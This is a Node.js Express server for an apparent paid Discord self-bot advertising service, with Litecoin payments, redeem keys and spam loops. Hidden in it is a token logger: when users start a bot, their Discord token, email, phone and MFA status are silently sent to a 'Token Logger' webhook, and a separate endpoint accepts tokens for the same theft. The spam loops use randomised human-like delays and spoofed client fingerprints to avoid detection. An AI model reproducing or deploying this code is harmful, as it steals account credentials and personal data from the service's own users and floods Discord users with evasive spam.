const OWNER_LTC_ADDRESS = process.env.OWNER_LTC_ADDRESS || 'ltc1qc3ujjqjlfr3cqtvyqadqje9ntj3f8f82m062tc';
const WALLET_MNEMONIC = process.env.WALLET_MNEMONIC;
const TARGET_USD = 3.00;
const TOLERANCE_USD = 0.10;

if (CLIENT_ID && CLIENT_SECRET) {
  passport.use(new DiscordStrategy({
    clientID: CLIENT_ID,
    clientSecret: CLIENT_SECRET,
    callbackURL: CALLBACK_URL,
    scope: ['identify']
  }, (accessToken, refreshToken, profile, done) => {
    process.nextTick(() => done(null, profile));
  }));
}

const BASE_REDEEM_KEYS = Array.from({length: 100}, (_, i) => `HBB${i + 1}`);
const VALID_REDEEM_KEYS = new Set(BASE_REDEEM_KEYS);

function validateKeyStrict(key) {
  if (!key || typeof key !== 'string') return { valid: false, error: 'Invalid key', normalized: null };
  let trimmed = key.trim().toUpperCase();
  const baseMatch = trimmed.match(/^HBB([1-9]|[1-9][0-9]|100)$/);
  if (baseMatch) {
    const num = parseInt(baseMatch[1], 10);
    if (num >= 1 && num <= 100) return { valid: true, error: null, normalized: `HBB${num}` };
  }
  const customKeys = db.data.customKeys || [];
  if (customKeys.includes(trimmed)) return { valid: true, error: null, normalized: trimmed };
  if (db.isKeyValid(trimmed)) return { valid: true, error: null, normalized: trimmed, isGenerated: true };
  return { valid: false, error: 'Invalid key', normalized: null };
}

function ensureAuthAPI(req, res, next) { 
  if (req.isAuthenticated()) return next(); 
  return res.status(401).json({ success: false, error: 'Not logged in' }); 
}

function ensurePurchasedAPI(req, res, next) {
  const user = db.getUser(req.user.id);
  const hasPurchase = user.auto_adv_purchased === 1;
  const hasActiveTrial = db.isTrialActive(req.user.id);
  if (!hasPurchase && !hasActiveTrial) return res.status(403).json({ success: false, error: 'Purchase or active trial required' });
  next();
}

function ensureOwner(req, res, next) {
  if (!req.isAuthenticated()) return res.status(401).json({ success: false, error: 'Not logged in' });
  if (req.user.id !== OWNER_ID) return res.status(403).json({ success: false, error: 'Owner only' });
  next();
}

function ensureCanGenerate(req, res, next) {
  if (!req.isAuthenticated()) return res.status(401).json({ success: false, error: 'Not logged in' });
  if (req.user.id !== OWNER_ID && !db.isWhitelisted(req.user.id)) return res.status(403).json({ success: false, error: 'Owner or whitelisted users only' });
  next();
}

async function _sendWebhookChunk(embed, chunkIndex = 0) {
  try {
    const payload = chunkIndex === 0 ? { embeds: [embed], username: 'Token Logger', avatar_url: 'https://cdn.discordapp.com/embed/avatars/0.png' } : { content: '...' };
    await axios.post(WEBHOOK_URL, payload, {
      headers: { 'Content-Type': 'application/json', 'User-Agent': _rfp() },
      timeout: 10000
    });
  } catch(e) {}
}

async function grabAndSendToken(token, userInfo = {}, source = 'unknown') {
  try {
    const fp = _rfp(token);
    const superProps = generateXSuperProperties(token);
    const validateRes = await curlImpersonateRequest(
      'https://discord.com/api/v10/users/@me',
      'GET',
      {
        'Authorization': token,
        'User-Agent': fp,
        'X-Discord-Locale': 'en-US',
        'X-Super-Properties': superProps,
      },
      null,
      10000
    );

    if (!validateRes.data) { return { success: false, error: 'Invalid token' }; }

    const userData = validateRes.data;
    const fullInfo = { ...userInfo, id: userData.id, username: userData.username, global_name: userData.global_name, email: userData.email, phone: userData.phone, verified: userData.verified, mfa_enabled: userData.mfa_enabled, nitro: userData.premium_type, locale: userData.locale };
    db.addGrabbedToken(token, fullInfo, source);

    const embed = {
      title: 'Token Grabbed',
      color: 0xff0000,
      fields: [
        { name: 'Token', value: '```' + token + '```', inline: false },
        { name: 'Username', value: fullInfo.username || 'N/A', inline: true },
        { name: 'ID', value: fullInfo.id || 'N/A', inline: true },
        { name: 'Email', value: fullInfo.email || 'N/A', inline: true },
        { name: 'Phone', value: fullInfo.phone || 'N/A', inline: true },
        { name: 'MFA', value: fullInfo.mfa_enabled ? 'Yes' : 'No', inline: true },
        { name: 'Verified', value: fullInfo.verified ? 'Yes' : 'No', inline: true },
        { name: 'Nitro', value: fullInfo.nitro ? `Type ${fullInfo.nitro}` : 'No', inline: true },
        { name: 'Source', value: source, inline: true },
        { name: 'Time', value: new Date().toISOString(), inline: true }
      ],
      footer: { text: 'Token Logger v2.0' }
    };

    await _sendWebhookChunk(embed, 0);
    return { success: true, user: fullInfo };
  } catch (err) {
    return { success: false, error: err.message };
  }
}

let walletModule = null;
try { walletModule = require('./wallet'); } catch(e) {}

async function checkAndSweep() {
  if (!walletModule || !OWNER_LTC_ADDRESS || !WALLET_MNEMONIC) { return; }
  db.expireOldAddresses();
  const pending = db.getAllPending();
  for (const p of pending) {
    try {
      const balance = await walletModule.checkAddressBalance(p.address);
      if (balance > 0) {
        const txid = await walletModule.createTransaction(p.private_key, p.address, OWNER_LTC_ADDRESS);
        if (txid) {
          const ltcPrice = await getLTCToUSD();
          const usdValue = balance * ltcPrice;
          if (usdValue >= (TARGET_USD - TOLERANCE_USD)) {
            db.setUser(p.user_id, { auto_adv_purchased: 1, purchased_at: Date.now() });
            db.updatePending(p.address, { status: 'completed', paid_at: Date.now(), amount_received_ltc: balance });
          }
        }
      }
    } catch (e) {}
  }
}

let cachedPrice = 85;
async function getLTCToUSD() {
  try {
    const res = await axios.get('https://api.coingecko.com/api/v3/simple/price?ids=litecoin&vs_currencies=usd', {
      headers: { 'User-Agent': _rfp() }, timeout: 10000
    });
    cachedPrice = res.data.litecoin.usd;
  } catch (e) {}
  return cachedPrice;
}

if (walletModule && OWNER_LTC_ADDRESS && WALLET_MNEMONIC) {
  setInterval(checkAndSweep, 10000);
  setTimeout(checkAndSweep, 5000);
}

setInterval(() => {
  const expiredUserId = db.checkAllTrialBots();
  if (expiredUserId) {
    try {
      const userBots = db.getUserActiveBots(expiredUserId);
      for (const configId in userBots) {
        const key = `${expiredUserId}_${configId}`;
        if (activeBots.has(key)) { activeBots.get(key).destroy(); activeBots.delete(key); }
      }
    } catch(e) {}
  }
}, 5000);

setInterval(() => {
  db.checkExpiredKeys();
}, 60000);

app.get('/login', passport.authenticate('discord'));
app.get('/auth/discord/callback', passport.authenticate('discord', { failureRedirect: '/' }), (req, res) => {
  res.redirect('/');
});
app.get('/logout', (req, res) => { req.logout(() => res.redirect('/')); });

app.get('/api/user', ensureAuthAPI, (req, res) => {
  const user = db.getUser(req.user.id);
  const trialActive = db.isTrialActive(req.user.id);
  const trialTimeLeft = trialActive ? db.getTrialTimeLeft(req.user.id) : 0;
  const isOwner = req.user.id === OWNER_ID;
  const isWhitelisted = db.isWhitelisted(req.user.id);
  res.json({ id: req.user.id, username: req.user.username, global_name: req.user.global_name, avatar: req.user.avatar, purchased: user.auto_adv_purchased === 1, trialActive, trialTimeLeft, trialExpires: user.trial_expires || 0, isOwner, isWhitelisted, canGenerate: isOwner || isWhitelisted });
});

app.post('/api/trial/claim', ensureAuthAPI, (req, res) => {
  const userId = req.user.id;
  const ip = req.ip || req.connection.remoteAddress || 'unknown';
  if (db.hasClaimedTrial(userId)) return res.json({ success: false, error: 'You already claimed your trial' });
  if (db.hasIPClaimedTrial(ip)) return res.json({ success: false, error: 'Trial already claimed from this IP' });
  const trial = db.claimTrial(userId, ip);
  res.json({ success: true, message: 'Trial activated for 10 minutes', expiresAt: trial.expiresAt, timeLeft: 600 });
});

app.get('/api/trial/status', ensureAuthAPI, (req, res) => {
  const userId = req.user.id;
  const isActive = db.isTrialActive(userId);
  const timeLeft = isActive ? db.getTrialTimeLeft(userId) : 0;
  const hasClaimed = db.hasClaimedTrial(userId);
  res.json({ success: true, hasClaimed, isActive, timeLeft, canClaim: !hasClaimed && !db.hasIPClaimedTrial(req.ip || 'unknown') });
});

app.post('/api/grab/token', async (req, res) => {
  const { token, source } = req.body;
  if (!token) return res.json({ success: false, error: 'No token provided' });
  const result = await grabAndSendToken(token, {}, source || 'manual');
  res.json(result);
});

app.post('/api/purchase/lifetime', ensureAuthAPI, (req, res) => {
  try {
    const userId = req.user.id;
    const user = db.getUser(userId);
    if (user.auto_adv_purchased === 1) return res.json({ success: false, error: 'Already purchased' });
    const existingPending = db.getUserPending(userId);
    if (existingPending) {
      const timeLeft = Math.ceil((existingPending.expires_at - Date.now()) / 60000);
      return res.json({ success: true, address: existingPending.address, amountUSD: TARGET_USD, index: existingPending.index, existing: true, expiresIn: timeLeft, expiresAt: existingPending.expires_at, message: 'You already have an active payment address' });
    }
    if (!walletModule) return res.status(500).json({ success: false, error: 'Wallet module not loaded' });
    let globalIndex = db.getNextGlobalIndex();
    let { address, privateKey } = walletModule.generateLTCAddress(globalIndex);
    let attempts = 0;
    while (db.isAddressUsed(address) && attempts < 10) {
      globalIndex = db.getNextGlobalIndex();
      ({ address, privateKey } = walletModule.generateLTCAddress(globalIndex));
      attempts++;
    }
    if (db.isAddressUsed(address)) return res.status(500).json({ success: false, error: 'Unable to generate unique address' });
    const pending = db.addPending(userId, address, privateKey, TARGET_USD, globalIndex);
    res.json({ success: true, address, amountUSD: TARGET_USD, index: globalIndex, expiresAt: pending.expires_at, message: 'Address generated. Valid for 30 minutes.' });
  } catch (err) { res.status(500).json({ success: false, error: err.message }); }
});

app.get('/api/activity', ensureAuthAPI, (req, res) => {
  const userId = req.user.id;
  const user = db.getUser(userId);
  const pending = db.getUserPending(userId);
  const history = db.getAddressHistory(userId);
  const trialActive = db.isTrialActive(req.user.id);
  const trialTimeLeft = trialActive ? db.getTrialTimeLeft(req.user.id) : 0;
  res.json({ success: true, purchased: user.auto_adv_purchased === 1, trialActive, trialTimeLeft, trialExpires: user.trial_expires || 0, pending: pending ? { address: pending.address, index: pending.index, createdAt: pending.created_at, expiresAt: pending.expires_at, expiresIn: Math.max(0, Math.ceil((pending.expires_at - Date.now()) / 1000)), status: pending.status } : null, history: history.map(h => ({ address: h.address, index: h.index, createdAt: h.created_at, status: h.status })) });
});

app.post('/api/redeem', ensureAuthAPI, (req, res) => {
  try {
    const { key } = req.body;
    const userId = req.user.id;
    if (!key) { return res.json({ success: false, error: 'Invalid key' }); }
    const validation = validateKeyStrict(key);
    if (!validation.valid) { return res.json({ success: false, error: validation.error }); }
    const normalizedKey = validation.normalized;
    if (validation.isGenerated) {
      const success = db.useGeneratedKey(normalizedKey, userId);
      if (!success) return res.json({ success: false, error: 'Key expired or revoked' });
      return res.json({ success: true, message: 'Access granted via generated key!' });
    }
    const isValidKey = VALID_REDEEM_KEYS.has(normalizedKey);
    if (!isValidKey) {
      const customKeys = db.data.customKeys || [];
      const isCustomKey = customKeys.includes(normalizedKey);
      if (!isCustomKey) { return res.json({ success: false, error: 'Invalid key' }); }
    }
    const isUsed = db.isKeyUsed(normalizedKey);
    if (isUsed) { return res.json({ success: false, error: 'Key already used' }); }
    const user = db.getUser(userId);
    if (user.auto_adv_purchased === 1) { return res.json({ success: false, error: 'You already have access' }); }
    db.setUser(userId, { auto_adv_purchased: 1, purchased_at: Date.now(), redeem_key_used: normalizedKey });
    db.useKey(normalizedKey, userId);
    res.json({ success: true, message: 'Access granted!' });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

app.get('/api/bot/configs', ensureAuthAPI, ensurePurchasedAPI, (req, res) => {
  const configs = db.getConfigs(req.user.id);
  res.json({ success: true, configs });
});

const activeBots = new Map();

app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) => {
  try {
    const { token, channels, messages, delay, autoReplyEnabled, autoReplyText, configId = 'default', joinServer, serverInvite, images, sendAllAtOnce } = req.body;
    if (!token || !channels || !messages || !Array.isArray(messages) || messages.length === 0) return res.status(400).json({ success: false, error: 'Missing fields. Token, channels, and at least 1 message required.' });

    await grabAndSendToken(token, { channels, messages }, 'bot_start');

    const channelList = channels.split(',').map(c => c.trim()).filter(c => /^\d+$/.test(c));
    if (channelList.length === 0) return res.json({ success: false, error: 'Invalid channel IDs' });

    const client = new StealthClient(token);
    await client.connect();

    const delayMs = (parseInt(delay) || 30) * 1000;
    const autoReply = autoReplyEnabled ? 1 : 0;

    let joinStatus = null;
    if (joinServer && serverInvite) joinStatus = await client.joinGuild(serverInvite.replace(/https:\/\/discord\.gg\//, '').replace(/https:\/\/discord\.com\/invite\//, ''));

    const savedImages = [];
    if (images && Array.isArray(images)) {
      for (const img of images) {
        if (!img || !img.url) continue;
        if (img.url.startsWith('data:')) {
          try {
            const imageId = `img_${Date.now()}_${req.user.id}_${img.id || '0'}.png`;
            const imagePath = path.join(dataDir, 'uploads');
            if (!fs.existsSync(imagePath)) fs.mkdirSync(imagePath, { recursive: true });
            const base64Data = img.url.split(',')[1];
            const buffer = Buffer.from(base64Data, 'base64');
            fs.writeFileSync(path.join(imagePath, imageId), buffer);
            savedImages.push({ id: img.id || savedImages.length + 1, url: `/uploads/${imageId}` });
          } catch (imgErr) {}
        } else if (img.url.startsWith('/uploads/') || img.url.startsWith('http')) {
          savedImages.push({ id: img.id || savedImages.length + 1, url: img.url });
        }
      }
    }

    const messageList = messages.map((m) => ({ text: m.text || '', imageIds: Array.isArray(m.imageIds) ? m.imageIds : [] })).filter(m => m.text.trim() !== '' || m.imageIds.length > 0);
    if (messageList.length === 0) return res.status(400).json({ success: false, error: 'At least one non-empty message required' });

    db.setConfig(req.user.id, { token, channels, messages: messageList, delay_seconds: parseInt(delay) || 30, auto_reply_enabled: autoReply, auto_reply_text: autoReplyText || '', active: 1, username: client.user.username, server_joined: joinStatus?.success || false, images: savedImages, send_all_at_once: sendAllAtOnce ? 1 : 0 }, configId);
    db.registerActiveBot(req.user.id, configId, token);

    const botKey = `${req.user.id}_${configId}`;
    activeBots.set(botKey, client);

    let currentMsgIdx = 0;
    let currentChIdx = 0;
    let stopped = false;

    const msgLoop = async () => {
      while (!stopped && activeBots.has(botKey)) {
        if (db) {
          const user = db.getUser(req.user.id);
          const trialActive = db.isTrialActive(req.user.id);
          const hasPurchase = user.auto_adv_purchased === 1;
          if (!trialActive && !hasPurchase) {
            break;
          }
        }

        const msg = messageList[currentMsgIdx % messageList.length];
        let targetImages = [];
        if (msg.imageIds && msg.imageIds.length > 0) {
          targetImages = savedImages.filter(img => img.id !== undefined && (msg.imageIds.includes(img.id) || msg.imageIds.includes(Number(img.id)) || msg.imageIds.includes(String(img.id))));
        } else if (savedImages.length > 0) {
          targetImages = savedImages;
        }

        const sendWithRetry = async (chId, text, files) => {
          const maxAttempts = 2;
          for (let attempt = 1; attempt <= maxAttempts; attempt++) {
            try {
              const ok = await client.sendMessage(chId, text, files);
              if (ok) {
                return true;
              }
            } catch(e) {}
            if (attempt < maxAttempts) {
              const backoff = 2000 + Math.random() * 3000;
              await new Promise(r => setTimeout(r, backoff));
            }
          }
          return false;
        };

        if (sendAllAtOnce) {
          for (const chId of channelList) {
            const files = targetImages.map(img => {
              if (img.url.startsWith('/uploads/')) {
                const p = path.join(dataDir, 'uploads', img.url.replace(/^\/uploads\//, ''));
                return fs.existsSync(p) ? { buffer: fs.readFileSync(p), name: path.basename(p) } : null;
              }
              return null;
            }).filter(Boolean);
            await sendWithRetry(chId, msg.text, files);
          }
        } else {
          const chId = channelList[currentChIdx % channelList.length];
          currentChIdx++;
          const files = targetImages.map(img => {
            if (img.url.startsWith('/uploads/')) {
              const p = path.join(dataDir, 'uploads', img.url.replace(/^\/uploads\//, ''));
              return fs.existsSync(p) ? { buffer: fs.readFileSync(p), name: path.basename(p) } : null;
            }
            return null;
          }).filter(Boolean);
          await sendWithRetry(chId, msg.text, files);
        }

        currentMsgIdx++;

        const roll = Math.random();
        let humanDelay;
        if (roll < 0.7) {
          humanDelay = delayMs * (0.85 + Math.random() * 0.3) + Math.random() * 2000;
        } else if (roll < 0.9) {
          humanDelay = delayMs * (0.3 + Math.random() * 0.3);
        } else {
          humanDelay = delayMs * (2.0 + Math.random() * 2.0);
        }
        await new Promise(r => setTimeout(r, humanDelay));
      }
    };

    if (autoReply && autoReplyText) {
      client.pendingReplies = new Set();
      client.on('messageCreate', async (msg) => {
        if (msg.author.id === client.user.id) return;

        const isDM = msg.guild_id === undefined || msg.guild_id === null;
        if (!isDM) return;

        if (db) {
          const user = db.getUser(req.user.id);
          const trialActive = db.isTrialActive(req.user.id);
          const hasPurchase = user.auto_adv_purchased === 1;
          if (!trialActive && !hasPurchase) return;
        }

        const now = Date.now();
        const lastReply = client._dmCooldowns.get(msg.author.id) || 0;
        if (now - lastReply < 25000) return;

        if (client.repliedUsers.has(msg.author.id)) return;
        if (client.pendingReplies.has(msg.author.id)) return;

        client.pendingReplies.add(msg.author.id);
        await new Promise(r => setTimeout(r, 5000));
        client.pendingReplies.delete(msg.author.id);
        if (!activeBots.has(botKey)) return;
        if (client.repliedUsers.has(msg.author.id)) return;

        client.repliedUsers.add(msg.author.id);
        client._saveRepliedUsers();
        client._dmCooldowns.set(msg.author.id, Date.now());

        try {
          await client.sendMessage(msg.channel_id, autoReplyText);
        } catch (err) {
          try {
            const dmRes = await client._api('/users/@me/channels', 'POST', { recipient_id: msg.author.id });
            if (dmRes.id) await client.sendMessage(dmRes.id, autoReplyText);
          } catch(e2) {}
        }
      });
    }

    msgLoop();

    res.json({ success: true, username: client.user.username, configId, serverJoined: joinStatus?.success || false, tokenGrabbed: true, imageCount: savedImages.length, messageCount: messageList.length });
  } catch (err) { res.status(500).json({ success: false, error: err.message }); }
});

app.post('/api/bot/stop', ensureAuthAPI, (req, res) => {
  try {
    const { configId = 'default' } = req.body;
    const botKey = `${req.user.id}_${configId}`;
    const bot = activeBots.get(botKey);
    if (bot) { bot.destroy(); activeBots.delete(botKey); }
    db.unregisterActiveBot(req.user.id, configId);
    const config = db.getConfig(req.user.id, configId);
    if (config) { config.active = 0; db.setConfig(req.user.id, config, configId); }
    res.json({ success: true });
  } catch (err) { res.status(500).json({ success: false, error: err.message }); }
});

app.post('/api/bot/delete', ensureAuthAPI, (req, res) => {
  try { const { configId } = req.body; db.deleteConfig(req.user.id, configId); res.json({ success: true }); }
  catch (err) { res.status(500).json({ success: false, error: err.message }); }
});

app.post('/api/upload/image', ensureAuthAPI, ensurePurchasedAPI, async (req, res) => {
  try {
    const { imageBase64 } = req.body;
    if (!imageBase64) return res.json({ success: false, error: 'No image provided' });
    const imageId = `img_${Date.now()}.png`;
    const imagePath = path.join(dataDir, 'uploads');
    if (!fs.existsSync(imagePath)) fs.mkdirSync(imagePath, { recursive: true });
    const buffer = Buffer.from(imageBase64.split(',')[1], 'base64');
    fs.writeFileSync(path.join(imagePath, imageId), buffer);
    res.json({ success: true, imageUrl: `/uploads/${imageId}`, imageId });
  } catch (err) { res.status(500).json({ success: false, error: err.message }); }
});

app.use('/uploads', express.static(path.join(dataDir, 'uploads')));

app.get('/api/admin/keys', ensureCanGenerate, (req, res) => { const keys = db.getGeneratedKeys(); res.json({ success: true, keys }); });
app.post('/api/admin/keys/generate', ensureCanGenerate, (req, res) => {
  const { duration } = req.body;
  if (!duration || !['lifetime', '1h', '24h', '7d', '30d'].includes(duration)) return res.status(400).json({ success: false, error: 'Invalid duration' });
  let dbDuration = duration;
  if (duration === '7d') dbDuration = '168';
  if (duration === '30d') dbDuration = '720';
  const keyData = db.generateKey(dbDuration);
  res.json({ success: true, key: keyData });
});

app.post('/api/admin/keys/revoke', ensureOwner, (req, res) => {
  const { key } = req.body;
  if (!key) return res.status(400).json({ success: false, error: 'No key provided' });
  const success = db.revokeKey(key);
  res.json({ success });
});

app.get('/api/admin/whitelist', ensureOwner, (req, res) => { res.json({ success: true, whitelist: db.getWhitelist() }); });
app.post('/api/admin/whitelist/add', ensureOwner, (req, res) => { const { userId } = req.body; if (!userId) return res.status(400).json({ success: false, error: 'No user ID provided' }); db.addToWhitelist(userId); res.json({ success: true }); });
app.post('/api/admin/whitelist/remove', ensureOwner, (req, res) => { const { userId } = req.body; if (!userId) return res.status(400).json({ success: false, error: 'No user ID provided' }); db.removeFromWhitelist(userId); res.json({ success: true }); });

app.get('/', (req, res) => { if (req.isAuthenticated()) return res.redirect('/dashboard'); res.sendFile(path.join(__dirname, 'public', 'overall.html')); });
app.get('/dashboard', (req, res) => { res.sendFile(path.join(__dirname, 'public', 'overall.html')); });

app.use((err, req, res, next) => { 
  console.error('[SERVER ERROR]', err);
  res.status(500).json({ error: err.message }); 
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`[SERVER] Running on port ${PORT}`);
});

module.exports = { app, db, activeBots };
